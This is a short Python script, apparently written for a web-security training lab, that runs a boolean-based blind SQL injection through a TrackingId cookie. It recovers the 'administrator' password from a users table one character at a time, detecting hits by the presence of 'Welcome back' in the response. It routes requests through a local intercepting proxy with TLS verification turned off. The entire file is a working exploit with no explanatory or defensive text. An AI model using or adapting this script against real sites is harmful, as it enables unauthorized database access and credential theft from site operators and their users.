import sys
import requests as req
import urllib3
from bs4 import BeautifulSoup as bs
import re
from enum import Flag
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def testB(url, tid, sessid):
    passw = ""
    for i in range(1,21):
        for j in range(32,126):
            sqlp = f"'+and+(select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--+-"
            cookies = {'TrackingId':f'{tid + sqlp}','session':f'{sessid}'}
            r = req.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome back" not in r.text:
                sys.stdout.write(f'{chr(j)}\r' + passw)
                sys.stdout.flush()
            else:
                passw += chr(j)
                sys.stdout.write('\r' + passw)
                sys.stdout.flush()
                break


if __name__ == '__main__':
    try:
        url = sys.argv[1]
        tid = sys.argv[2]
        sessid = sys.argv[3]
        testB(url, tid, sessid)
    except IndexError:
        print(f"Usage: {sys.argv[0]} <baseUrl> <trackingId> <session>")
